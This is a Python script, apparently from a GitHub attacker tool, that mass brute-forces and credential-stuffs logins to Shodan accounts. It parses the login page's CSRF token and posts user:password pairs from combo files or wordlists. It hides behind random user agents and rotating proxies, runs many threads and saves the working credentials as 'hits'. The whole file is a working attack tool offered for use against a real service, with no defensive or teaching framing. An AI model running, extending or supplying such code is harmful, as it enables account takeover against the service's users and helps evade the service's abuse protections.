import requests
from bs4 import BeautifulSoup
import datetime
import os.path
import threading
import easygui
import random
from fake_useragent import UserAgent
ua = UserAgent()
user_agent = ua.random

now = datetime.datetime.now()
date_str = now.strftime('%Y-%m-%d')
good = f'Good_{date_str}.txt'
bad = f'Bad_{date_str}.txt'
session = requests.session()
headers = {
    'User-Agent': user_agent,
    'Pragma': 'no-cache',
    'Accept': '*/*',
}

def banner():
    print("""

  _________.__               .___                      __________                __                
 /   _____/|  |__   ____   __| _/____    ____          \______   \_______ __ ___/  |_  ___________ 
 \_____  \ |  |  \ /  _ \ / __ |\__  \  /    \   ______ |    |  _/\_  __ \  |  \   __\/ __ \_  __ \
 /        \|   Y  (  <_> ) /_/ | / __ \|   |  \ /_____/ |    |   \ |  | \/  |  /|  | \  ___/|  | \/
/_______  /|___|  /\____/\____ |(____  /___|  /         |______  / |__|  |____/ |__|  \___  >__|   
        \/      \/            \/     \/     \/                 \/                         \/       
By theattacker

github:https://github.com/TheNewAttacker64/ 
    """)



if os.path.exists("Results") == False:
    os.mkdir("Results")
os.chdir("Results")

def get_proxy():
    proxy_file = easygui.fileopenbox("Select Proxy File")

    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    proxies.append({'https': line})

    return  proxies
def GenFiles():
    with open(good, 'w') as f:
        pass
    with open(bad, 'w') as a:
        pass


def login(username, password,proxy,proxies):
    try:
        chosen = []
        if proxy == False:
            csrfparse = session.get("https://account.shodan.io/login", headers=headers, allow_redirects=True).text
        else:
            chosen = random.choice(proxies)

            csrfparse = session.get("https://account.shodan.io/login", headers=headers, allow_redirects=True,
                                    proxies=chosen,timeout=1).text

        soup = BeautifulSoup(csrfparse, 'html.parser')

        csrf_input = soup.find('input', {'name': 'csrf_token'})

        if csrf_input:
            csrf_token = csrf_input['value']

            data = "username=" + username + "&password=" + password + "&grant_type=password&continue=http%3A%2F%2Fwww.shodan.io%2Fdashboard&csrf_token=" + csrf_token
            if proxy == False:
                loginrequest = session.post("https://account.shodan.io/login", headers=headers, data=data)
            else:
                loginrequest = session.post("https://account.shodan.io/login", headers=headers, data=data,
                                            proxies=chosen, timeout=1)

            if "Invalid username or password" in loginrequest.text:
                print("[-] Bad Cred " + username + ":" + password)
                with open(bad, 'a') as Bad:
                    Bad.write(username + ":" + password + "\n")
            elif "Dashboard" in loginrequest.text:
                print("[+] Hit " + username + ":" + password)

                with open(good, 'a') as hits:
                    hits.write(username + ":" + password + "\n")
                return  True

            else:
                print("Wierd Response Use Proxy")
                if proxy == True:
                    print("Trying again with another proxy")
                    login(username, password,proxy,proxies)

    except OSError:
        print("Check your proxies will try using other proxies from the list")
        login(username, password, proxy, proxies)

def main():
    banner()
    pr = None
    proxies = []
    print("""
1) Shodan Mass Bruter Combo Format User:Pass
2) Brute 1 Account 1 Username
    """)
    options = int(input("Choose An Option:"))
    if options == 1:
        proxy = input("Are you going to use Proxy Y/N:").upper()
        if proxy == 'Y':
            pr = True
            proxies = get_proxy()
        elif proxy == "N":
            pr = False
        else:
            print("Invalid Choice")
        combo = easygui.fileopenbox("Combo File Cred User:Pass")
        Threadsm = int(input("How Much threads do you want:"))
        threads = []

        with open(combo,'r') as com:
            for i in com:
                par = i.rstrip('\n')
                cred = par.split(":")
                user = cred[0]
                password = cred[1]
                thread = threading.Thread(target=login, args=(user, password, pr,proxies))
                threads.append(thread)
        print("[*] Starting All Threads")
        try:
            for i in range(Threadsm):
                threads[i].start()

            for thread in threads:
                thread.join()
        except:
            pass

    elif options == 2:
        username =  input("Enter The Username you Want to attack:")
        wordlist = easygui.fileopenbox("Select your Wordlist for the Attack")
        proxy = input("Do you Want to Use proxy Y/N:").upper()
        if proxy == 'Y':
            pr = True
            proxies = get_proxy()
        elif proxy == 'N':
            pr = False
        else:
            print("Invalid Choice")
        with open(wordlist, 'r') as com:
            for i in com:
                password = i.rstrip('\n')
                if login(username, password, pr, proxies) == True:
                    print("[+] Congrats Password Found", password)
                    break
    else:
        main()


main()
